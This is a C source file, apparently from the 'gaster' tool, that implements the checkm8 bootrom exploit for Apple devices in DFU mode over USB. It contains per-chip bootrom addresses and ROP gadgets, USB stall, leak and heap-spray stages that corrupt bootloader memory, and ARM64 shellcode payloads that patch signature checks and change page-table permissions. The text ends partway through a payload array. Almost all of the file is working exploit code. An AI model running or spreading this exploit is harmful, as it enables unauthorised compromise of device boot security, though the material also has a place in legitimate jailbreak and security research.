/* Copyright 2022 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#	include <libusb-1.0/libusb.h>
#	include <stdbool.h>
#	include <string.h>
#	include <stddef.h>
#  	include <stdio.h>
#  	include <stddef.h>
#	include <inttypes.h>

#define MIN(a, b) ((a) < (b) ? (a) : (b))


typedef struct {
	uint64_t func, arg;
} callback_t;

typedef struct {
	const uint8_t *buf;
	size_t len;
} der_item_t;

typedef struct {
	uint8_t off, tag, flags;
} der_item_spec_t;

typedef struct {
	uint64_t prev, next;
} dfu_list_node_t;

typedef struct {
	uint32_t endpoint, pad_0;
	uint64_t io_buffer;
	uint32_t status, io_len, ret_cnt, pad_1;
	uint64_t callback, next;
} dfu_callback_t;

typedef struct {
	der_item_t magic, type, vers, data, kbag, comp;
} im4p_t;

typedef struct {
	der_item_t magic;
	im4p_t im4p;
} img4_t;

typedef struct {
	uint32_t magic_0, pad_0;
	dfu_list_node_t task_list, queue_list;
	enum {
		TASK_INITIAL,
		TASK_READY,
		TASK_RUNNING,
		TASK_BLOCKED,
		TASK_SLEEPING,
		TASK_FINISHED
	} state;
	uint32_t irq_dis_cnt;
	struct {
		uint64_t x[29], fp, lr, sp;
		uint8_t shc[0x310 - 32 * sizeof(uint64_t)];
	} arch;
	struct {
		dfu_list_node_t list;
		uint64_t sched_ticks, delay, cb, arg;
	} callout;
	dfu_list_node_t ret_waiters_list;
	uint32_t ret, pad_1;
	uint64_t routine, arg, stack_base, stack_len;
	char name[15 + 1];
	uint32_t id, magic_1;
} dfu_task_t;

typedef struct {
	dfu_callback_t callback;
	uint64_t heap_pad_0, heap_pad_1;
} checkm8_overwrite_t;

typedef struct {
	dfu_task_t synopsys_task;
	struct {
		uint64_t this_free : 1, prev_free : 1, prev_sz : 62, this_sz;
		uint8_t pad[0x40 - 2 * sizeof(uint64_t)];
	} heap_block;
	dfu_task_t fake_task;
} eclipsa_overwrite_t;

typedef struct {
	uint16_t vid, pid;
	int usb_interface;
	struct libusb_context *context;
	struct libusb_device_handle *device;
} usb_handle_t;

typedef bool (*usb_check_cb_t)(usb_handle_t *, void *);

enum usb_transfer {
	USB_TRANSFER_OK,
	USB_TRANSFER_ERROR,
	USB_TRANSFER_STALL
};

typedef struct {
	enum usb_transfer ret;
	uint32_t sz;
} transfer_ret_t;

static uint16_t cpid;
static unsigned usb_timeout;
static const char *pwnd_str = " PWND:[gaster]";
static struct {
	uint8_t b_len, b_descriptor_type;
	uint16_t bcd_usb;
	uint8_t b_device_class, b_device_sub_class, b_device_protocol, b_max_packet_sz;
	uint16_t id_vendor, id_product, bcd_device;
	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
} device_descriptor;
static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, exit_critical_section, enter_critical_section, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;

static void
sleep_ms(unsigned ms) {
	Sleep(ms);
}


static void
close_usb_handle(usb_handle_t *handle) {
	libusb_release_interface(handle->device, handle->usb_interface);
	libusb_close(handle->device);
	libusb_exit(handle->context);
}

static bool
reset_usb_handle(const usb_handle_t *handle) {
	return libusb_reset_device(handle->device) == LIBUSB_SUCCESS;
}

static bool
wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_interface, usb_check_cb_t usb_check_cb, void *arg) {
	int config;

	if(libusb_init(&handle->context) == LIBUSB_SUCCESS) {
		printf("[libusb] Waiting for the USB handle with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 "\n", handle->vid, handle->pid);
		for(;;) {
			if((handle->device = libusb_open_device_with_vid_pid(handle->context, handle->vid, handle->pid)) != NULL) {
				if(libusb_get_configuration(handle->device, &config) == LIBUSB_SUCCESS && libusb_set_configuration(handle->device, config) == LIBUSB_SUCCESS && libusb_claim_interface(handle->device, usb_interface) == LIBUSB_SUCCESS) {
					if((usb_alt_interface != 1 || libusb_set_interface_alt_setting(handle->device, usb_interface, usb_alt_interface) == LIBUSB_SUCCESS) && (usb_check_cb == NULL || usb_check_cb(handle, arg))) {
						handle->usb_interface = usb_interface;
						puts("Found the USB handle.");
						return true;
					}
					libusb_release_interface(handle->device, usb_interface);
				}
				libusb_close(handle->device);
			}
			sleep_ms(usb_timeout);
		}
		libusb_exit(handle->context);
	}
	return false;
}

static void
usb_async_cb(struct libusb_transfer *transfer) {
	*(int *)transfer->user_data = 1;
}

static bool
send_usb_control_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
	int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_timeout);

	if(transfer_ret != NULL) {
		if(ret >= 0) {
			transfer_ret->sz = (uint32_t)ret;
			transfer_ret->ret = USB_TRANSFER_OK;
		} else if(ret == LIBUSB_ERROR_PIPE) {
			transfer_ret->ret = USB_TRANSFER_STALL;
		} else {
			transfer_ret->ret = USB_TRANSFER_ERROR;
		}
	}
	return true;
}

static bool
send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	struct libusb_transfer *transfer = libusb_alloc_transfer(0);
	struct timeval tv;
	int completed = 0;
	uint8_t *buf;

	if(transfer != NULL) {
		if((buf = malloc(LIBUSB_CONTROL_SETUP_SIZE + w_len)) != NULL) {
			if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
				memcpy(buf + LIBUSB_CONTROL_SETUP_SIZE, p_data, w_len);
			}
			libusb_fill_control_setup(buf, bm_request_type, b_request, w_value, w_index, (uint16_t)w_len);
			libusb_fill_control_transfer(transfer, handle->device, buf, usb_async_cb, &completed, usb_timeout);
			if(libusb_submit_transfer(transfer) == LIBUSB_SUCCESS) {
				tv.tv_sec = usb_abort_timeout / 1000;
				tv.tv_usec = (usb_abort_timeout % 1000) * 1000;
				while(completed == 0 && libusb_handle_events_timeout_completed(handle->context, &tv, &completed) == LIBUSB_SUCCESS) {
					libusb_cancel_transfer(transfer);
				}
				if(completed != 0) {
					if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_IN) {
						memcpy(p_data, libusb_control_transfer_get_data(transfer), transfer->actual_length);
					}
					if(transfer_ret != NULL) {
						transfer_ret->sz = (uint32_t)transfer->actual_length;
						if(transfer->status == LIBUSB_TRANSFER_COMPLETED) {
							transfer_ret->ret = USB_TRANSFER_OK;
						} else if(transfer->status == LIBUSB_TRANSFER_STALL) {
							transfer_ret->ret = USB_TRANSFER_STALL;
						} else {
							transfer_ret->ret = USB_TRANSFER_ERROR;
						}
					}
				}
			}
			free(buf);
		}
		libusb_free_transfer(transfer);
	}
	return completed != 0;
}

static void
init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
	handle->vid = vid;
	handle->pid = pid;
	handle->device = NULL;
	handle->context = NULL;
}

static bool
send_usb_control_request_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, transfer_ret);
		free(p_data);
	}
	return ret;
}

static bool
send_usb_control_request_async_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, usb_abort_timeout, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, usb_abort_timeout, transfer_ret);
		free(p_data);
	}
	return ret;
}

static char *
get_usb_serial_number(usb_handle_t *handle) {
	transfer_ret_t transfer_ret;
	uint8_t buf[UINT8_MAX];
	char *str = NULL;
	size_t i, sz;

	if(send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(device_descriptor) && send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == buf[0] && (sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL) {
		for(i = 0; i < sz; ++i) {
			str[i] = (char)buf[2 * (i + 1)];
		}
		str[sz - 1] = '\0';
	}
	return str;
}

static bool
checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
	char *usb_serial_num = get_usb_serial_number(handle);
	bool ret = false;

	if(usb_serial_num != NULL) {
		puts(usb_serial_num);
		if(strstr(usb_serial_num, " SRTG:[iBoot-1704.10]") != NULL) {
			cpid = 0x8960;
			config_large_leak = 7936;
			config_overwrite_pad = 0x5C0;
			patch_addr = 0x100005CE0;
			memcpy_addr = 0x10000ED50;
			aes_crypto_cmd = 0x10000B9A8;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180086CDC;
			dfu_handle_request = 0x180086C70;
			usb_core_do_transfer = 0x10000CC78;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000CFB4;
			usb_create_string_descriptor = 0x10000BFEC;
			usb_serial_number_string_descriptor = 0x180080562;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
			cpid = 0x7001;
			patch_addr = 0x10000AD04;
			memcpy_addr = 0x100013F10;
			aes_crypto_cmd = 0x100010A90;
			io_buffer_addr = 0x18010D500;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180088E48;
			dfu_handle_request = 0x180088DF8;
			usb_core_do_transfer = 0x100011BB4;
			arch_task_tramp_addr = 0x100010988;
			insecure_memory_base = 0x180380000;
			synopsys_routine_addr = 0x1000064FC;
			handle_interface_request = 0x100011EE4;
			usb_create_string_descriptor = 0x100011074;
			usb_serial_number_string_descriptor = 0x180080C2A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
			cpid = 0x7000;
			patch_addr = 0x100007E98;
			memcpy_addr = 0x100010E70;
			aes_crypto_cmd = 0x10000DA90;
			io_buffer_addr = 0x18010D300;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x1800888C8;
			dfu_handle_request = 0x180088878;
			usb_core_do_transfer = 0x10000EBB4;
			arch_task_tramp_addr = 0x10000D988;
			insecure_memory_base = 0x180380000;
			synopsys_routine_addr = 0x100005530;
			handle_interface_request = 0x10000EEE4;
			usb_create_string_descriptor = 0x10000E074;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
			cpid = 0x8003;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			io_buffer_addr = 0x18010D500;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			arch_task_tramp_addr = 0x10000D998;
			insecure_memory_base = 0x180380000;
			synopsys_routine_addr = 0x100006718;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
			cpid = 0x8000;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			io_buffer_addr = 0x18010D500;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			arch_task_tramp_addr = 0x10000D998;
			insecure_memory_base = 0x180380000;
			synopsys_routine_addr = 0x100006718;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2481.0.0.2.1]") != NULL) {
			cpid = 0x8001;
			config_hole = 6;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000404;
			nop_gadget = 0x10000CD60;
			ret_gadget = 0x100000118;
			patch_addr = 0x100007668;
			ttbr0_addr = 0x180050000;
			func_gadget = 0x10000CD40;
			write_ttbr0 = 0x1000003B4;
			memcpy_addr = 0x1000106F0;
			aes_crypto_cmd = 0x10000C9D4;
			boot_tramp_end = 0x180044000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180047578;
			dfu_handle_request = 0x18004C378;
			usb_core_do_transfer = 0x10000DDA4;
			insecure_memory_base = 0x180000000;
			exit_critical_section = 0x100009B88;
			enter_critical_section = 0x100009B24;
			handle_interface_request = 0x10000E0B4;
			usb_create_string_descriptor = 0x10000D280;
			usb_serial_number_string_descriptor = 0x18004486A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2696.0.0.1.33]") != NULL) {
			cpid = 0x8010;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000434;
			nop_gadget = 0x10000CC6C;
			ret_gadget = 0x10000015C;
			patch_addr = 0x1000074AC;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CC4C;
			write_ttbr0 = 0x1000003E4;
			memcpy_addr = 0x100010730;
			aes_crypto_cmd = 0x10000C8F4;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083CF8;
			dfu_handle_request = 0x180088B48;
			usb_core_do_transfer = 0x10000DC98;
			insecure_memory_base = 0x1800B0000;
			exit_critical_section = 0x10000A514;
			enter_critical_section = 0x10000A4B8;
			handle_interface_request = 0x10000DFB8;
			usb_create_string_descriptor = 0x10000D150;
			usb_serial_number_string_descriptor = 0x1800805DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3135.0.0.2.3]") != NULL) {
			cpid = 0x8011;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000444;
			nop_gadget = 0x10000CD0C;
			ret_gadget = 0x100000148;
			patch_addr = 0x100007630;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CCEC;
			write_ttbr0 = 0x1000003F4;
			memcpy_addr = 0x100010950;
			aes_crypto_cmd = 0x10000C994;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083D28;
			dfu_handle_request = 0x180088A58;
			usb_core_do_transfer = 0x10000DD64;
			insecure_memory_base = 0x1800B0000;
			exit_critical_section = 0x10000A6A0;
			enter_critical_section = 0x10000A658;
			handle_interface_request = 0x10000E08C;
			usb_create_string_descriptor = 0x10000D234;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL) {
			cpid = 0x8015;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x1000004AC;
			nop_gadget = 0x10000A9C4;
			ret_gadget = 0x100000148;
			patch_addr = 0x10000624C;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x10000A9AC;
			write_ttbr0 = 0x10000045C;
			memcpy_addr = 0x10000E9D0;
			aes_crypto_cmd = 0x100009E9C;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003A78;
			dfu_handle_request = 0x180008638;
			usb_core_do_transfer = 0x10000B9A8;
			insecure_memory_base = 0x18001C000;
			exit_critical_section = 0x10000F9A0;
			enter_critical_section = 0x10000F958;
			handle_interface_request = 0x10000BCCC;
			usb_create_string_descriptor = 0x10000AE80;
			usb_serial_number_string_descriptor = 0x1800008FA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
			cpid = 0x8012;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000494;
			nop_gadget = 0x100008DB8;
			ret_gadget = 0x10000012C;
			patch_addr = 0x100004854;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x100008DA0;
			write_ttbr0 = 0x100000444;
			memcpy_addr = 0x10000EA30;
			aes_crypto_cmd = 0x1000082AC;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003AF8;
			dfu_handle_request = 0x180008B08;
			usb_core_do_transfer = 0x10000BD20;
			insecure_memory_base = 0x18001C000;
			exit_critical_section = 0x10000FA00;
			enter_critical_section = 0x10000F9B8;
			handle_interface_request = 0x10000BFFC;
			usb_create_string_descriptor = 0x10000B1CC;
			usb_serial_number_string_descriptor = 0x18000082A;
		}
		if(cpid != 0) {
			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
			ret = true;
		}
		free(usb_serial_num);
	}
	return ret;
}

static bool
dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
	struct {
		uint8_t status, poll_timeout[3], state, str_idx;
	} dfu_status;
	transfer_ret_t transfer_ret;

	return send_usb_control_request(handle, 0xA1, 3, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
}

static bool
dfu_set_state_wait_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 0x21, 1, 0, 0, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0 && dfu_check_status(handle, 0, 6) && dfu_check_status(handle, 0, 7) && dfu_check_status(handle, 0, 8);
}

static bool
checkm8_stage_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	if(send_usb_control_request_no_data(handle, 0x21, 1, 0, 0, 16, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 16 && dfu_set_state_wait_reset(handle) && send_usb_control_request_no_data(handle, 0x21, 1, 0, 0, 0x40, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0x40) {
		return true;
	}
	send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
	return false;
}

static bool
checkm8_stall(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = 0;
	transfer_ret_t transfer_ret;

	while(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 10, 3 * 0x40, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < 3 * 0x40 && send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 10, 0x40, 1, &transfer_ret) && transfer_ret.sz == 0) {
			return true;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % usb_timeout;
	}
	return false;
}

static bool
checkm8_no_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 10, 3 * 0x40 + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_usb_request_stall(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL;
}

static bool
checkm8_usb_request_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 10, 0x40, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_usb_request_no_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 10, 0x40 + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_stage_spray(const usb_handle_t *handle) {
	size_t i;

	if(config_large_leak == 0) {
		if(!checkm8_stall(handle)) {
			return false;
		}
		for(i = 0; i < config_hole; ++i) {
			if(!checkm8_no_leak(handle)) {
				return false;
			}
		}
		if(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {
			return false;
		}
	} else {
		if(!checkm8_usb_request_stall(handle)) {
			return false;
		}
		for(i = 0; i < config_large_leak; ++i) {
			if(!checkm8_usb_request_leak(handle)) {
				return false;
			}
		}
		if(!checkm8_usb_request_no_leak(handle)) {
			return false;
		}
	}
	return true;
}

static bool
checkm8_stage_setup(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = 0;
	transfer_ret_t transfer_ret;

	while(send_usb_control_request_async_no_data(handle, 0x21, 1, 0, 0, 0x800, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
			send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
			return true;
		}
		if(!send_usb_control_request_no_data(handle, 0x21, 1, 0, 0, 0x40, NULL)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % usb_timeout;
	}
	return false;
}

static size_t
usb_rop_callbacks(uint8_t *buf, uint64_t addr, const callback_t *callbacks, size_t callback_cnt) {
	uint8_t block_0[0x50], block_1[0x50];
	size_t i, j, sz = 0, block_0_sz, block_1_sz;
	uint64_t reg;

	for(i = 0; i < callback_cnt; i += 5) {
		block_1_sz = block_0_sz = 0;
		for(j = 0; j < 5; ++j) {
			addr += 0x50 / 5;
			if(j == 4) {
				addr += 0x50;
			}
			if(i + j < callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = addr;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else if(i + j == callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else {
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
			}
		}
		memcpy(buf + sz, block_0, block_0_sz);
		sz += block_0_sz;
		memcpy(buf + sz, block_1, block_1_sz);
		sz += block_1_sz;
	}
	return sz;
}

static bool
dfu_send_data(const usb_handle_t *handle, uint8_t *data, size_t len, bool strict) {
	transfer_ret_t transfer_ret;
	size_t i, packet_sz;

	for(i = 0; i < len; i += packet_sz) {
		packet_sz = MIN(len - i, 0x800);
		if((!send_usb_control_request(handle, 0x21, 1, 0, 0, &data[i], packet_sz, &transfer_ret) || transfer_ret.ret != USB_TRANSFER_OK || transfer_ret.sz != packet_sz) && strict) {
			return false;
		}
	}
	return true;
}

static bool
checkm8_stage_patch(const usb_handle_t *handle) {
	uint32_t payload_notA9[] = {
		/* _main: */
		0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
		0x580003E0, /* ldr x0, =payload_dest */
		0x58000403, /* ldr x3, =dfu_handle_request */
		0x91003001, /* add x1, x0, #0xC */
		0xF9000061, /* str x1, [x3] */
		0x10FFFF61, /* adr x1, _main */
		0x580003C2, /* ldr x2, =payload_off */
		0x8B020021, /* add x1, x1, x2 */
		0x580003C2, /* ldr x2, =payload_sz */
		0x580003E3, /* ldr x3, =memcpy_addr */
		0xD63F0060, /* blr x3 */
		0x580003E0, /* ldr x0, =gUSBSerialNumber */
		/* _find_zero_loop: */
		0x91000400, /* add x0, x0, #1 */
		0x39400001, /* ldrb w1, [x0] */
		0x35FFFFC1, /* cbnz w1, _find_zero_loop */
		0x100001A1, /* adr x1, PWND_STR */
		0xA9400C22, /* ldp x2, x3, [x1] */
		0xA9000C02, /* stp x2, x3, [x0] */
		0x58000300, /* ldr x0, =gUSBSerialNumber */
		0x58000321, /* ldr x1, =usb_create_string_descriptor */
		0xD63F0020, /* blr x1 */
		0x58000321, /* ldr x1, =usb_serial_number_string_descriptor */
		0x39000020, /* strb w0, [x1] */
		0x52BA5002, /* mov w2, #0xD2800000 */
		0x58000303, /* ldr x3, =patch_addr */
		0xB9000062, /* str w2, [x3] */
		0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
		0xD65F03C0 /* ret */
	}, payload_A9[] = {
		/* _main: */
		0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
		0x580005A0, /* ldr x0, =payload_dest */
		0x580005C3, /* ldr x3, =dfu_handle_request */
		0x91003001, /* add x1, x0, #0xC */
		0xF9000061, /* str x1, [x3] */
		0x10FFFF61, /* adr x1, _main */
		0x58000582, /* ldr x2, =payload_off */
		0x8B020021, /* add x1, x1, x2 */
		0x58000582, /* ldr x2, =payload_sz */
		0x580005A3, /* ldr x3, =memcpy_addr */
		0xD63F0060, /* blr x3 */
		0x580005A0, /* ldr x0, =gUSBSerialNumber */
		/* _find_zero_loop: */
		0x91000400, /* add x0, x0, #1 */
		0x39400001, /* ldrb w1, [x0] */
		0x35FFFFC1, /* cbnz w1, _find_zero_loop */
		0x10000361, /* adr x1, PWND_STR */
		0xA9400C22, /* ldp x2, x3, [x1] */
		0xA9000C02, /* stp x2, x3, [x0] */
		0x580004C0, /* ldr x0, =gUSBSerialNumber */
		0x580004E1, /* ldr x1, =usb_create_string_descriptor */
		0xD63F0020, /* blr x1 */
		0x580004E1, /* ldr x1, =usb_serial_number_string_descriptor */
		0x39000020, /* strb w0, [x1] */
		0x580004E0, /* ldr x0, =ttbr0_vrom_addr */
		0xF9400001, /* ldr x1, [x0] */
		0x9278F421, /* bic x1, x1, #ARM_TTE_BLOCK_APMASK */
		0xF9000001, /* str x1, [x0] */
		0xD5033F9F, /* dsb sy */
		0xD50E871F, /* tlbi alle3 */
		0xD5033F9F, /* dsb sy */
		0xD5033FDF, /* isb */
		0x52BA5002, /* mov w2, #0xD2800000 */
		0x58000403, /* ldr x3, =patch_addr */
		0xB9000062, /* str w2, [x3] */
		0xB2790021, /* orr x1, x1, #ARM_TTE_BLOCK_AP(AP_RONA) */
		0xF9000001, /* str x1, [x0] */
		0xD5033F9F, /* dsb sy */
		0xD50E871F, /* tlbi alle3 */
		0xD5033F9F, /* dsb sy */
		0xD5033FDF, /* isb */
		0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
		0xD65F03C0 /* ret */
	}, payload_handle_checkm8_request[] = {
		/* _main: */
		0x580004C7, /* ldr x7, =handle_interface_request */
		0xD61F00E0, /* br x7 */
		0x17FFFFFE, /* b _main */
		0x79400002, /* ldrh w2, [x0] */
		0x710A845F, /* cmp w2, #0x2A1 */
		0x54FFFF61, /* bne _main */
		0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
		0xA9BF53F3, /* stp x19, x20, [sp, #-0x10]! */
		0xAA0003F3, /* mov x19, x0 */
		0x580003F4, /* ldr x20, =insecure_memory_base */
		0x529FFFE1, /* mov w1, #0xFFFF */
		0x79400662, /* ldrh w2, [x19, #0x2] */
		0x6B02003F, /* cmp w1, w2 */
		0x540001E1, /* bne _request_done */
		0xF9400280, /* ldr x0, [x20] */
		0x58000361, /* ldr x1, =exec_magic */
